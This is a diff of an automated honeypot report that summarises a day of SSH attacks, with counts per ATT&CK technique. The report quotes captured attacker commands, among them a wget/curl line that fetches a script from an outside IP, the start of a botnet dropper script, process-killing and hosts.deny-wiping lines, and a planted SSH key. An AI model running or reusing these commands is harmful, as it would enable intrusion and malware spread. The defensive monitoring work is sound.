@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-27 14:01:45",
+  "generated": "2026-09-27 15:01:45",
   "totals": {
-    "commands": 1452,
-    "login_failed": 2898,
-    "login_success": 138,
-    "sessions": 3270
+    "commands": 1502,
+    "login_failed": 3232,
+    "login_success": 141,
+    "sessions": 3623
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2898,
+      "count": 3232,
       "examples": [
         "mongo / 1qaz@WSX",
         "gitlab-runner / qwerty",
@@ -21,8 +21,8 @@
         "admin / admin"
       ],
       "first": "2026-09-27T00:00:14.493551Z",
-      "last": "2026-09-27T13:52:08.071317Z",
-      "unique_ips": 81
+      "last": "2026-09-27T15:01:44.548147Z",
+      "unique_ips": 84
     },
     {
       "id": "T1222.002",
@@ -44,7 +44,7 @@
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 138,
+      "count": 141,
       "examples": [
         "root / root",
         "enable / linuxshell",
@@ -53,14 +53,14 @@
         "root / 1234"
       ],
       "first": "2026-09-27T00:02:58.504576Z",
-      "last": "2026-09-27T13:50:19.269438Z",
-      "unique_ips": 65
+      "last": "2026-09-27T14:35:46.696051Z",
+      "unique_ips": 68
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 134,
+      "count": 136,
       "examples": [
         "uname -s -v -n -r -m",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -69,14 +69,14 @@
         "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
       ],
       "first": "2026-09-27T02:21:33.158204Z",
-      "last": "2026-09-27T13:42:58.774426Z",
-      "unique_ips": 22
+      "last": "2026-09-27T14:35:47.565006Z",
+      "unique_ips": 24
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 74,
+      "count": 86,
       "examples": [
         "cd /tmp;rm -rf wget.sh; wget http://202.110.70.60:800/wget.sh; busybox wget http://202.110.70.60:800/wget.sh; curl -O ht",
         "http://202.110.70.60:800/wget.sh",
@@ -85,8 +85,8 @@
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; "
       ],
       "first": "2026-09-27T02:39:43.674112Z",
-      "last": "2026-09-27T13:43:08.571378Z",
-      "unique_ips": 27
+      "last": "2026-09-27T14:30:26.866099Z",
+      "unique_ips": 28
     },
     {
       "id": "T1033",
@@ -123,16 +123,32 @@
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 20,
+      "count": 30,
       "examples": [
         "ls /home; /bin/busybox BOTNET",
         "ls -l /tmp/.testfile 2>&1",
         "ls -lh $(which ls)",
-        "ls -la px86"
+        "ls -la px86",
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
       ],
       "first": "2026-09-27T00:07:42.916360Z",
-      "last": "2026-09-27T13:39:27.206462Z",
-      "unique_ips": 18
+      "last": "2026-09-27T14:30:25.165864Z",
+      "unique_ips": 19
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 20,
+      "examples": [
+        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a",
+        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i"
+      ],
+      "first": "2026-09-27T02:39:49.903645Z",
+      "last": "2026-09-27T14:30:25.165864Z",
+      "unique_ips": 11
     },
     {
       "id": "T1098.004",
@@ -161,20 +177,6 @@
       "first": "2026-09-27T02:39:49.903645Z",
       "last": "2026-09-27T12:19:56.958739Z",
       "unique_ips": 11
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 10,
-      "examples": [
-        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a",
-        "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
-        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep"
-      ],
-      "first": "2026-09-27T02:39:49.903645Z",
-      "last": "2026-09-27T12:19:56.958739Z",
-      "unique_ips": 10
     },
     {
       "id": "T1087.001",
@@ -221,19 +223,19 @@
     ],
     [
       "system",
-      86
+      87
     ],
     [
       "sh",
-      85
+      86
     ],
     [
       "shell",
-      84
+      85
     ],
     [
       "enable",
-      83
+      84
     ],
     [
       "ping; sh",
@@ -245,7 +247,11 @@
     ],
     [
       "/bin/busybox",
-      11
+      14
+    ],
+    [
+      "sh .k",
+      10
     ],
     [
       "cd /tmp",
@@ -280,19 +286,15 @@
       3
     ],
     [
+      "linuxshell",
+      3
+    ],
+    [
       "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
       3
     ],
     [
       "bash",
-      3
-    ],
-    [
-      "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
-      3
-    ],
-    [
-      "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
       3
     ]
   ]
